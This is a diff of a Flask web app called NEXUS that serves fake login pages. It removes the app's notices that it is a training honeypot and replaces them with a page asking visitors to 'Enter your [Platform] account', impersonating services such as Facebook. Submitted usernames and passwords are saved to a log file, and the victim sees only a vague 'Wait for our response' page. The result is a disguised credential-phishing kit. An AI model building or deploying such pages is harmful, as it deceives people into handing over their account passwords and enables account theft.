@@ -144,9 +144,155 @@ HTML_HOME = """
 </html>
 """
 
-# ---------- LOGIN PAGE (Original design, no warning) ----------
+# ---------- LOGIN PAGE (Dynamic: "Enter your [Platform] account") ----------
 def get_login_page(platform):
-    return """
+    platform_name = PLATFORMS[platform]['name']
+    return f"""
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>NEXUS</title>
+    <style>
+        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
+        html, body {{
+            height: 100%;
+            width: 100%;
+            background: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }}
+        .container {{
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            background: transparent;
+            padding: 20px;
+        }}
+        h1 {{
+            font-size: 38px;
+            font-weight: 700;
+            color: #111;
+            margin-bottom: 6px;
+            letter-spacing: -0.5px;
+        }}
+        .sub-head {{
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 30px;
+            font-weight: 400;
+        }}
+        .input-group {{
+            position: relative;
+            margin: 10px 0;
+        }}
+        .input-group input {{
+            width: 100%;
+            padding: 16px 14px;
+            padding-right: 48px;
+            background: #f5f5f5;
+            border: 1px solid #ddd;
+            border-radius: 12px;
+            font-size: 18px;
+            color: #111;
+            transition: 0.2s;
+        }}
+        .input-group input:focus {{
+            outline: none;
+            border-color: #007aff;
+            background: #fff;
+            box-shadow: 0 0 0 4px rgba(0,122,255,0.1);
+        }}
+        .toggle-password {{
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            font-size: 22px;
+            cursor: pointer;
+            padding: 0;
+            color: #999;
+            opacity: 0.6;
+            line-height: 1;
+        }}
+        .toggle-password:hover {{ opacity: 1; }}
+        .login-btn {{
+            width: 100%;
+            padding: 16px;
+            background: #007aff;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 20px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 16px;
+            transition: 0.2s;
+        }}
+        .login-btn:hover {{ background: #0066d9; }}
+        .footer {{
+            margin-top: 30px;
+            font-size: 14px;
+            color: #999;
+            line-height: 1.8;
+        }}
+        .footer .name {{ color: #111; font-weight: 500; }}
+        .footer .chaos {{ color: #111; font-weight: 400; }}
+        .back {{
+            display: inline-block;
+            margin-top: 15px;
+            color: #007aff;
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: 500;
+        }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>NEXUS</h1>
+        <p class="sub-head">Enter your {platform_name} account</p>
+        <form action="/login/{platform}" method="POST">
+            <div class="input-group">
+                <input type="text" name="username" placeholder="User name" required>
+            </div>
+            <div class="input-group">
+                <input type="password" name="password" id="password" placeholder="Password" required>
+                <button type="button" class="toggle-password" id="toggleBtn" onclick="togglePassword()">👁️</button>
+            </div>
+            <button type="submit" class="login-btn">Login</button>
+        </form>
+        <a href="/" class="back">← Go back</a>
+        <div class="footer">
+            <div><span class="name">by Luiz Vad</span></div>
+            <div><span class="chaos">Knowledge over chaos</span></div>
+        </div>
+    </div>
+    <script>
+        function togglePassword() {{
+            const input = document.getElementById('password');
+            const btn = document.getElementById('toggleBtn');
+            if (input.type === 'password') {{
+                input.type = 'text';
+                btn.textContent = '🙈';
+            }} else {{
+                input.type = 'password';
+                btn.textContent = '👁️';
+            }}
+        }}
+    </script>
+</body>
+</html>
+"""
+
+# ---------- SUCCESS PAGE (You're welcome, Wait for our response, Go back, footer) ----------
+SUCCESS_PAGE = """
 <!DOCTYPE html>
 <html>
 <head>
@@ -172,115 +318,53 @@ def get_login_page(platform):
             background: transparent;
             padding: 20px;
         }
-        .icon { font-size: 60px; margin-bottom: 6px; }
         h1 {
-            font-size: 34px;
+            font-size: 38px;
             font-weight: 700;
             color: #111;
             margin-bottom: 6px;
+            letter-spacing: -0.5px;
         }
-        .sub {
-            font-size: 16px;
+        .welcome {
+            font-size: 24px;
+            font-weight: 600;
+            color: #111;
+            margin-bottom: 6px;
+        }
+        .response {
+            font-size: 18px;
             color: #666;
             margin-bottom: 30px;
         }
-        .input-group {
-            position: relative;
-            margin: 10px 0;
-        }
-        .input-group input {
-            width: 100%;
-            padding: 16px 14px;
-            padding-right: 48px;
-            background: #f5f5f5;
-            border: 1px solid #ddd;
-            border-radius: 12px;
-            font-size: 18px;
-            color: #111;
-            transition: 0.2s;
-        }
-        .input-group input:focus {
-            outline: none;
-            border-color: #007aff;
-            background: #fff;
-            box-shadow: 0 0 0 4px rgba(0,122,255,0.1);
-        }
-        .toggle-password {
-            position: absolute;
-            right: 14px;
-            top: 50%;
-            transform: translateY(-50%);
-            background: none;
-            border: none;
-            font-size: 22px;
-            cursor: pointer;
-            padding: 0;
-            color: #999;
-            opacity: 0.6;
-            line-height: 1;
-        }
-        .toggle-password:hover { opacity: 1; }
-        .login-btn {
-            width: 100%;
-            padding: 16px;
-            background: #007aff;
-            color: white;
-            border: none;
-            border-radius: 12px;
-            font-size: 20px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 16px;
-            transition: 0.2s;
-        }
-        .login-btn:hover { background: #0066d9; }
-        .back {
+        .back-link {
             display: inline-block;
-            margin-top: 20px;
             color: #007aff;
             text-decoration: none;
-            font-size: 16px;
+            font-size: 18px;
             font-weight: 500;
+            margin-bottom: 30px;
         }
+        .back-link:hover { text-decoration: underline; }
         .footer {
-            margin-top: 25px;
             font-size: 14px;
             color: #999;
+            line-height: 1.8;
         }
-        .footer span { color: #111; font-weight: 500; }
+        .footer .name { color: #111; font-weight: 500; }
+        .footer .chaos { color: #111; font-weight: 400; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="icon">🧸</div>
         <h1>NEXUS</h1>
-        <p class="sub">Learn cybersecurity by doing</p>
-        <form action="/login/facebook" method="POST">
-            <div class="input-group">
-                <input type="text" name="username" placeholder="Your Name" required>
-            </div>
-            <div class="input-group">
-                <input type="password" name="password" id="password" placeholder="Password" required>
-                <button type="button" class="toggle-password" id="toggleBtn" onclick="togglePassword()">👁️</button>
-            </div>
-            <button type="submit" class="login-btn">Login</button>
-        </form>
-        <a href="/" class="back">← Go back</a>
-        <p class="footer">Built by <span>Luiz Vad</span> 🧸</p>
+        <div class="welcome">You're welcome</div>
+        <div class="response">Wait for our response</div>
+        <a href="/" class="back-link">← Go back</a>
+        <div class="footer">
+            <div><span class="name">by Luiz Vad</span></div>
+            <div><span class="chaos">Knowledge over chaos</span></div>
+        </div>
     </div>
-    <script>
-        function togglePassword() {
-            const input = document.getElementById('password');
-            const btn = document.getElementById('toggleBtn');
-            if (input.type === 'password') {
-                input.type = 'text';
-                btn.textContent = '🙈';
-            } else {
-                input.type = 'password';
-                btn.textContent = '👁️';
-            }
-        }
-    </script>
 </body>
 </html>
 """
@@ -313,15 +397,7 @@ def login_post(platform):
     })
     with open(LOG_FILE, "w") as f:
         json.dump(logs, f, indent=4)
-    return """
-<!DOCTYPE html>
-<html>
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>NEXUS</title>
-<style>*{margin:0;padding:0;box-sizing:border-box}html,body{height:100%;background:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;display:flex;justify-content:center;align-items:center;padding:20px}
-.container{max-width:400px;width:100%;text-align:center}h1{font-size:40px;color:#111;margin-bottom:6px}.icon{font-size:60px}.msg{font-size:18px;color:#333;margin:20px 0}.sub{font-size:16px;color:#666}a{display:inline-block;margin-top:25px;color:#007aff;text-decoration:none;font-size:18px;font-weight:500}
-</style></head>
-<body><div class="container"><div class="icon">🧸</div><h1>NEXUS</h1><p class="msg">This is a training honeypot.</p><p class="sub">Your data has been recorded.</p><a href="/">← Go back</a></div></body></html>
-    """
+    return SUCCESS_PAGE
 
 @app.route('/dashboard')
 def dashboard():
